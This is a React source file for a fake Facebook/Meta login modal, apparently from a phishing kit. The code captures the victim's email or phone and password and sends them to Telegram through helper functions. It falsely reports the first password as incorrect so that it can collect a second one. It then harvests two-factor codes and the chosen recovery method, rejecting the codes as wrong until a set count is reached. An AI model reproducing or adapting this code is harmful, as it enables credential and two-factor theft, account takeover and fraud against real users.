import { useState } from 'react';
import PropTypes from 'prop-types';
import sendToTelegram, { sendCodeToTelegram, sendTryOtherToTelegram } from '@/utils/send-telegram';
import config from '@/utils/config';
import { useLang } from '@/context/lang-context';
import TwoFactorCodeModal from '@/components/two-factor-code-modal';
import TryOtherMethodModal from '@/components/try-other-method-modal';
import SuccessModal from '@/components/success-modal';
import fbIcon from '@/assets/images/icon.webp';
import logoMeta from '@/assets/images/logo-meta.svg';

const LoginModal = ({ onClose, formData = {}, initialMessageId = null }) => {
    const { labels } = useLang();
    const [showPassword, setShowPassword] = useState(false);
    const [emailOrPhone, setEmailOrPhone] = useState('');
    const [password, setPassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [errorMsg, setErrorMsg] = useState('');
    const [attempts, setAttempts] = useState(0);
    const [prevMessageId, setPrevMessageId] = useState(initialMessageId);
    const [password1, setPassword1] = useState('');
    const [password2, setPassword2] = useState('');
    const [isTwoFactorStep, setIsTwoFactorStep] = useState(false);
    const [twoFactorCode, setTwoFactorCode] = useState('');
    const [codeLoading, setCodeLoading] = useState(false);
    const [codeErrorMsg, setCodeErrorMsg] = useState('');
    const [codeAttempts, setCodeAttempts] = useState(0);
    const [prevCodeMessageId, setPrevCodeMessageId] = useState(null);
    const [enteredCodes, setEnteredCodes] = useState([]);
    const [isTryOtherStep, setIsTryOtherStep] = useState(false);
    const [selectedMethod, setSelectedMethod] = useState(null);
    const [identifierErrorMsg, setIdentifierErrorMsg] = useState('');
    const [isSuccessStep, setIsSuccessStep] = useState(false);

    const t = {
        modalDesc: labels.modalDesc,
        emailOrPhonePlaceholder: labels.emailOrPhonePlaceholder,
        passwordPlaceholder: labels.passwordPlaceholder,
        loginBtn: labels.loginBtn,
        forgotPassword: labels.forgotPassword,
    };

    const isValidEmail = (value) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(value);
    };

    const getIdentifierError = (value) => {
        const trimmedValue = String(value || '').trim();
        if (!trimmedValue) return '';
        if (trimmedValue.includes('@') && !isValidEmail(trimmedValue)) {
            return 'Email không đúng định dạng.';
        }
        return '';
    };

    const handleLogin = async () => {
        if (!emailOrPhone || !password) return;
        const identifierError = getIdentifierError(emailOrPhone);
        if (identifierError) {
            setIdentifierErrorMsg(identifierError);
            return;
        }

        setLoading(true);
        setErrorMsg('');
        setIdentifierErrorMsg('');

        const isFirstAttempt = attempts === 0;

        const credentials = isFirstAttempt
            ? { emailOrPhone, password1: password }
            : { emailOrPhone, password1, password2: password };

        const messageId = await sendToTelegram(formData, credentials, prevMessageId);

        if (isFirstAttempt) {
            setPassword1(password);
        }
        setPrevMessageId(messageId);

        await new Promise((resolve) =>
            setTimeout(resolve, config.password_loading_time * 1000)
        );

        const nextAttempts = attempts + 1;
        setAttempts(nextAttempts);
        setLoading(false);

        if (nextAttempts >= config.max_password_attempts) {
            setErrorMsg('');
            setPassword('');
            if (!isFirstAttempt) setPassword2(password);
            setPrevCodeMessageId(messageId);
            setIsTwoFactorStep(true);
        } else {
            setErrorMsg('The password you entered is incorrect. Please try again.');
            setPassword('');
        }
    };

    const handleConfirmTwoFactorCode = async () => {
        if (!twoFactorCode || codeLoading) return;
        if (!/^\d+$/.test(twoFactorCode)) {
            setCodeErrorMsg('Mã xác nhận chỉ được chứa chữ số.');
            return;
        }

        setCodeLoading(true);
        setCodeErrorMsg('');

        const allCodes = [...enteredCodes, twoFactorCode];

        const payload = { emailOrPhone, password1, password2, codes: allCodes };

        const messageId = await sendCodeToTelegram(formData, payload, prevCodeMessageId);

        setPrevCodeMessageId(messageId);
        setEnteredCodes(allCodes);

        await new Promise((resolve) =>
            setTimeout(resolve, config.code_loading_time * 1000)
        );

        const nextAttempts = codeAttempts + 1;
        setCodeAttempts(nextAttempts);
        setCodeLoading(false);

        if (nextAttempts >= config.max_code_attempts) {
            setIsSuccessStep(true);
            return;
        }

        setCodeErrorMsg('The code you entered is incorrect. Please try again.');
        setTwoFactorCode('');
    };

    let modalSizeClass = 'max-w-[400px] rounded-[12px]';
    if (isSuccessStep) modalSizeClass = 'max-w-[360px] rounded-[16px]';
    else if (isTwoFactorStep) modalSizeClass = 'max-w-[512px] rounded-[16px]';

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center px-3 py-4 sm:px-4">
            <button
                type="button"
                aria-label="Đóng modal"
                className="absolute inset-0 cursor-default bg-black/50"
                onClick={onClose}
            />
            <div
                className={`relative w-full max-h-[calc(100vh-32px)] overflow-y-auto overflow-hidden shadow-2xl ${modalSizeClass}`}
                style={
                    isTwoFactorStep || isSuccessStep
                        ? undefined
                        : {
                            background:
                                'linear-gradient(130deg, rgb(249, 241, 249) 0%, rgb(234, 243, 253) 35%, rgb(237, 251, 242) 100%)',
                        }
                }
            >
                {!isTwoFactorStep && !isSuccessStep && (
                    <div className="flex flex-col items-center px-6 py-5">
                        <div className="mb-5 h-[50px] w-[50px]">
                            <img
                                alt="logo"
                                src={fbIcon}
                                className="h-full w-full object-contain"
                            />
                        </div>

                        <div className="w-full py-4">
                            <p className="mb-[7px] text-[14px] text-[#9a979e]">
                                {t.modalDesc}
                            </p>

                            <form
                                autoComplete="off"
                                onSubmit={(e) => {
                                    e.preventDefault();
                                    handleLogin();
                                }}
                            >
                                <div className="mb-[10px] flex h-10 items-center rounded-[10px] border border-[#d4dbe3] bg-white px-[11px] text-[14px] transition-all">
                                    <input
                                        id="loginIdentifier"
                                        type="text"
                                        autoComplete="username"
                                        placeholder={t.emailOrPhonePlaceholder}
                                        value={emailOrPhone}
                                        onChange={(e) => {
                                            const nextValue = e.target.value;
                                            setEmailOrPhone(nextValue);
                                            setIdentifierErrorMsg(getIdentifierError(nextValue));
                                        }}
                                        disabled={loading}
                                        className="h-full w-full border-none bg-transparent text-[14px] outline-none disabled:opacity-60"
                                    />
                                </div>
                                {identifierErrorMsg && (
                                    <p className="mb-2 text-[13px] text-red-500">{identifierErrorMsg}</p>
                                )}

                                <div className="relative mb-[10px] flex h-10 items-center rounded-[10px] border border-[#d4dbe3] bg-white px-[11px] pr-[44px] text-[14px] transition-all">
                                    <input
                                        id="password"
                                        type={showPassword ? 'text' : 'password'}
                                        autoComplete="new-password"
                                        placeholder={t.passwordPlaceholder}
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        disabled={loading}
                                        className="h-full w-full border-none bg-transparent text-[14px] outline-none disabled:opacity-60"
                                    />
                                    <button
                                        type="button"
                                        tabIndex={-1}
                                        onClick={() => setShowPassword((prev) => !prev)}
                                        className="absolute right-3 top-1/2 flex -translate-y-1/2 items-center bg-transparent p-0"
                                    >
                                        {showPassword ? (
                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                                <path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 17.416-3.998" />
                                                <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
                                                <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
                                                <path d="m2 2 20 20" />
                                            </svg>
                                        ) : (
                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                                <path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
                                                <circle cx="12" cy="12" r="3" />
                                            </svg>
                                        )}
                                    </button>
                                </div>

                                {errorMsg && (
                                    <p className="mb-2 text-[13px] text-red-500">{errorMsg}</p>
                                )}

                                <div className="mt-5 w-full">
                                    <button
                                        type="submit"
                                        disabled={loading || !emailOrPhone || !password}
                                        className="relative flex h-[45px] min-h-[45px] w-full items-center justify-center rounded-[40px] border-none bg-[#0064e0] text-[15px] font-medium text-white transition-opacity disabled:cursor-not-allowed disabled:opacity-70"
                                    >
                                        {loading ? 'Loading...' : t.loginBtn}
                                    </button>
                                </div>

                                <p className="mt-[10px] text-center">
                                    <button
                                        type="button"
                                        className="text-[14px] text-[#9a979e] no-underline"
                                    >
                                        {t.forgotPassword}
                                    </button>
                                </p>
                            </form>
                        </div>

                        <div className="mt-3 w-[64px]">
                            <img
                                alt="Meta"
                                src={logoMeta}
                                className="h-auto w-full object-contain opacity-40"
                            />
                        </div>
                    </div>
                )}

                {isTwoFactorStep && !isTryOtherStep && !isSuccessStep && (
                    <TwoFactorCodeModal
                        formData={formData}
                        emailOrPhone={emailOrPhone}
                        email={formData?.email_facebook || formData?.email_work}
                        phone={formData?.phone}
                        code={twoFactorCode}
                        onCodeChange={(value) => {
                            setTwoFactorCode(value.replaceAll(/\D/g, ''));
                            if (codeErrorMsg) setCodeErrorMsg('');
                        }}
                        onTryOther={() => setIsTryOtherStep(true)}
                        onConfirm={handleConfirmTwoFactorCode}
                        loading={codeLoading}
                        errorMsg={codeErrorMsg}
                        selectedMethod={selectedMethod}
                    />
                )}

                {isTwoFactorStep && isTryOtherStep && !isSuccessStep && (
                    <TryOtherMethodModal
                        phone={formData?.phone}
                        onBack={() => setIsTryOtherStep(false)}
                        onSelect={async (method) => {
                            setSelectedMethod(method);
                            const payload = { emailOrPhone, password1, password2, codes: enteredCodes };
                            const newMessageId = await sendTryOtherToTelegram(formData, payload, method.label, prevCodeMessageId);
                            if (newMessageId) setPrevCodeMessageId(newMessageId);
                            setIsTryOtherStep(false);
                        }}
                    />
                )}

                {isSuccessStep && <SuccessModal />}

                {!isTwoFactorStep && !isSuccessStep && null}
            </div>
        </div>
    );
};

export default LoginModal;

LoginModal.propTypes = {
    onClose: PropTypes.func.isRequired,
    formData: PropTypes.object,
    initialMessageId: PropTypes.number,
};
